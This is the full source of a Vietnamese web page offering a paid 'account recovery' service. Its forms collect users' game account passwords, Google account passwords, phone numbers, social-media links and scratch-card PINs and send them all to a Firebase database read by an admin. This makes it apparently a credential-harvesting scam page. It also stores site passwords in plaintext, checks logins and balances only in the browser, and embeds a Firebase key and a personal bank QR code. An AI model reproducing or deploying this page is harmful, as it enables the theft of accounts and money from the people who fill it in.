<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAYLAITAIKHOAN - Admin Đại</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
    <style>
        body { background-color: #0f172a; color: white; -webkit-tap-highlight-color: transparent; }
        .hidden { display: none; }
        .tab-active { color: #3b82f6; border-bottom: 2px solid #3b82f6; }
        @keyframes pulse-green { 0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(34, 197, 94, 0); } 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); } }
        .btn-new-msg { animation: pulse-green 2s infinite; background-color: #22c55e !important; }
    </style>
</head>
<body>

    <div id="auth-screen" class="min-h-screen flex items-center justify-center p-4">
        <div class="bg-slate-800 p-8 rounded-3xl shadow-2xl w-full max-w-md border border-slate-700 text-center">
            <h2 class="text-xl font-bold mb-6 italic">LAYLAITAIKHOAN - <span class="text-blue-500">Dxz</span> <span class="text-yellow-500">( Đại )</span></h2>
            <div class="space-y-4">
                <input type="text" id="auth-user" placeholder="Tên đăng nhập" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-xl outline-none focus:border-blue-500">
                <input type="password" id="auth-pass" placeholder="Mật khẩu" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-xl outline-none focus:border-blue-500">
                <div class="flex gap-2">
                    <button onclick="auth('reg')" class="flex-1 bg-slate-700 py-3 rounded-xl font-bold text-xs uppercase transition-all active:scale-95">Đăng ký</button>
                    <button onclick="auth('login')" class="flex-1 bg-blue-600 py-3 rounded-xl font-bold text-xs uppercase shadow-lg transition-all active:scale-95">Đăng nhập</button>
                </div>
            </div>
        </div>
    </div>

    <div id="main-app" class="hidden min-h-screen flex flex-col">
        <header class="p-4 flex justify-between items-center border-b border-slate-800 sticky top-0 bg-[#0f172a] z-50">
            <div class="flex items-center gap-3">
                <span class="text-2xl font-black text-blue-500 italic">Dxz</span>
                <button onclick="openResultModal()" id="btn-receive" class="hidden px-3 py-1.5 rounded-lg text-[9px] font-black uppercase text-white shadow-lg">Nhận TK/MK</button>
            </div>
            <div class="text-yellow-400 font-bold text-xs bg-slate-900 px-4 py-1.5 rounded-full border border-slate-700">
                <span id="balance">0</span>đ
            </div>
        </header>

        <div id="global-announcement" class="hidden px-4 pt-4">
            <div class="bg-blue-500/10 border border-blue-500/40 rounded-2xl p-3 flex gap-3 items-start shadow-sm">
                <span class="text-lg">📢</span>
                <div class="flex-1 text-[11px] text-slate-300 leading-relaxed" id="note-content"></div>
            </div>
        </div>

        <nav class="flex justify-around text-[10px] font-black border-b border-slate-800 uppercase mt-2">
            <button onclick="showTab('recovery')" id="nav-recovery" class="p-4 tab-active flex-1">Lấy lại Acc</button>
            <button onclick="showTab('topup')" id="nav-topup" class="p-4 text-slate-500 flex-1">Nạp tiền</button>
        </nav>

        <main class="flex-1 p-4 max-w-md mx-auto w-full pb-10">
            <section id="p-recovery" class="space-y-4">
                <div class="bg-blue-600 p-3 rounded-2xl text-center font-bold text-xs uppercase shadow-md">Phí dịch vụ: 11,000đ</div>
                <div class="bg-slate-800/50 p-5 rounded-3xl border border-slate-700 space-y-3 shadow-inner">
                    <input type="text" id="rec-1" placeholder="Lí do mất acc" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    <div class="grid grid-cols-2 gap-2">
                        <input type="text" id="rec-2" placeholder="Tên đăng nhập" class="bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                        <input type="text" id="rec-3" placeholder="Mật khẩu cũ" class="bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    </div>
                    <input type="text" id="rec-4" placeholder="Ngày sinh khi tạo acc" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    <div class="grid grid-cols-2 gap-2">
                        <input type="text" id="rec-5" placeholder="ID Google" class="bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                        <input type="text" id="rec-6" placeholder="Pass Google" class="bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    </div>
                    <input type="text" id="rec-7" placeholder="Số điện thoại" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    <input type="text" id="rec-8" placeholder="Link Facebook/Zalo" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    <button onclick="submitRecovery()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-sm uppercase shadow-lg active:scale-95 transition-all">Gửi yêu cầu duyệt</button>
                </div>
            </section>

            <section id="p-topup" class="hidden space-y-4">
                <div class="bg-slate-800/50 p-4 rounded-3xl border border-blue-500/20 text-center shadow-lg">
                    <p class="text-blue-400 font-bold text-[10px] uppercase mb-2">Quét mã nạp ATM (11k)</p>
                    <img src="https://api.vietqr.io/image/970422-0343714652-qS9TAtk.jpg?accountName=NGUYEN%20THI%20TUY&amount=11000&addInfo=DxzShop" class="w-40 h-40 mx-auto rounded-lg bg-white p-1 shadow-2xl">
                </div>

                <div class="bg-slate-800/50 p-5 rounded-3xl border border-slate-700 space-y-3 shadow-inner">
                    <p class="text-slate-500 font-bold text-[10px] uppercase text-center underline">Nạp Thẻ Cào (Duyệt chậm)</p>
                    <select id="card-type" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none"><option>Viettel</option><option>Zing</option><option>Garena</option><option>Mobi</option><option>Vina</option></select>
                    <select id="card-price" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none"><option value="10000">10,000đ</option><option value="20000">20,000đ</option><option value="50000">50,000đ</option><option value="100000">100,000đ</option></select>
                    <input type="text" id="card-seri" placeholder="Số Seri" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    <input type="text" id="card-pin" placeholder="Mã thẻ (PIN)" class="w-full bg-slate-900 p-3 rounded-xl text-sm border border-slate-700 outline-none">
                    <button onclick="submitCard()" class="w-full bg-green-600 py-3 rounded-xl font-bold uppercase text-[10px] shadow-lg active:scale-95 transition-all">Gửi thẻ cho Admin</button>
                </div>
            </section>
        </main>

        <div id="modal-result" class="fixed inset-0 bg-black/90 z-[100] flex items-center justify-center p-6 hidden">
            <div class="bg-slate-800 w-full max-w-xs rounded-3xl border-2 border-green-500 p-6 space-y-4 relative shadow-2xl">
                <button onclick="closeModal()" class="absolute -top-3 -right-3 bg-red-600 w-8 h-8 rounded-full font-bold text-xs shadow-lg">X</button>
                <div class="bg-slate-900 p-3 rounded-xl border border-slate-700"><p id="res-tk" class="font-bold text-sm break-all"></p></div>
                <div class="bg-slate-900 p-3 rounded-xl border border-slate-700"><p id="res-mk" class="font-bold text-sm break-all"></p></div>
                <p class="text-[8px] text-center text-slate-500 uppercase">Admin Đại đã cấp lại thành công!</p>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBHo70-xMpsutE9nqWXZZMlmxfjBsyi37Y",
            authDomain: "dxzshop-c73de.firebaseapp.com",
            databaseURL: "https://dxzshop-c73de-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "dxzshop-c73de",
            storageBucket: "dxzshop-c73de.firebasestorage.app",
            messagingSenderId: "763860456626",
            appId: "1:763860456626:web:6a48747b9e1105b62625ab"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentUser = null;
        let userMessage = "";

        async function auth(type) {
            const u = document.getElementById('auth-user').value.trim().toLowerCase();
            const p = document.getElementById('auth-pass').value.trim();
            if(!u || !p) return alert("Nhập đủ thông tin!");
            const snap = await db.ref('users/' + u).get();
            if(type === 'reg') {
                if(snap.exists()) return alert("Tài khoản đã tồn tại!");
                await db.ref('users/' + u).set({ pass: p, balance: 0 });
                alert("Đăng ký thành công!");
            } else {
                if(snap.exists() && snap.val().pass === p) {
                    currentUser = u;
                    document.getElementById('auth-screen').classList.add('hidden');
                    document.getElementById('main-app').classList.remove('hidden');
                    listenCloud();
                } else alert("Sai tài khoản hoặc mật khẩu!");
            }
        }

        function listenCloud() {
            // Theo dõi tiền và tin nhắn
            db.ref('users/' + currentUser).on('value', snap => {
                const data = snap.val();
                if(!data) return;
                document.getElementById('balance').innerText = (data.balance || 0).toLocaleString();
                if(data.message) {
                    userMessage = data.message;
                    document.getElementById('btn-receive').classList.remove('hidden');
                    document.getElementById('btn-receive').classList.add('btn-new-msg');
                } else document.getElementById('btn-receive').classList.add('hidden');
            });

            // Theo dõi thông báo Admin
            db.ref('global_note').on('value', snap => {
                const note = snap.val();
                const box = document.getElementById('global-announcement');
                if(note && note.content) {
                    box.classList.remove('hidden');
                    document.getElementById('note-content').innerText = note.content;
                } else {
                    box.classList.add('hidden');
                }
            });
        }

        async function submitCard() {
            const type = document.getElementById('card-type').value;
            const price = document.getElementById('card-price').value;
            const seri = document.getElementById('card-seri').value.trim();
            const pin = document.getElementById('card-pin').value.trim();
            if(!seri || !pin) return alert("Nhập đủ thông tin thẻ!");
            await db.ref('cards').push({ user: currentUser, type, price, seri, pin, time: new Date().toLocaleString() });
            alert("Đã gửi thẻ! Chờ Admin duyệt.");
            document.getElementById('card-seri').value = "";
            document.getElementById('card-pin').value = "";
        }

        async function submitRecovery() {
            const snap = await db.ref('users/' + currentUser).get();
            const bal = snap.val().balance || 0;
            if(bal < 11000) return alert("Cần nạp thêm 11k!");
            await db.ref('users/' + currentUser + '/balance').set(bal - 11000);
            const data = []; for(let i=1; i<=8; i++) data.push(document.getElementById('rec-'+i).value);
            await db.ref('recovery').push({ user: currentUser, data, time: new Date().toLocaleString() });
            alert("Đã gửi đơn!");
        }

        function openResultModal() {
            const parts = userMessage.split('|');
            document.getElementById('res-tk').innerText = "Tài khoản: " + (parts[0] || "Chờ...");
            document.getElementById('res-mk').innerText = "Mật khẩu: " + (parts[1] || "Chờ...");
            document.getElementById('modal-result').classList.remove('hidden');
        }

        async function closeModal() {
            document.getElementById('modal-result').classList.add('hidden');
            await db.ref('users/' + currentUser + '/message').remove();
        }

        function showTab(t) {
            document.getElementById('p-recovery').classList.toggle('hidden', t!=='recovery');
            document.getElementById('p-topup').classList.toggle('hidden', t!=='topup');
            document.getElementById('nav-recovery').classList.toggle('tab-active', t==='recovery');
            document.getElementById('nav-topup').classList.toggle('tab-active', t==='topup');
        }
    </script>
</body>
</html>
